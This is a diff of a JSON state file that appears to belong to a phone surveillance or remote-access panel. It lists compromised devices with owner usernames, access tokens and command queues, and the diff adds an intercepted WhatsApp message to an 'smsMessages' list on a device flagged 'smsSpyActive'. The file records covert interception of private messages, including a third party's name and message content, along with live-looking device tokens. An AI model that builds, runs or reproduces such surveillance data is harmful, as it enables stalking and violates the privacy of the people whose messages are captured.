@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777765111228,
+    "lastSeen": 1777765118166,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -2141,7 +2141,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777765111455,
+    "lastSeen": 1777765141502,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -2157,6 +2157,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎PP AZKHAL MUSTOFA CIKUDA (2 pesan): ~ MUSTOFA ARAFAT",
+        "content": "😁😁",
+        "time": "03/05 06:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777765142195
+      },
       {
         "appName": "WhatsApp",
         "sender": "PP AZKHAL MUSTOFA CIKUDA",
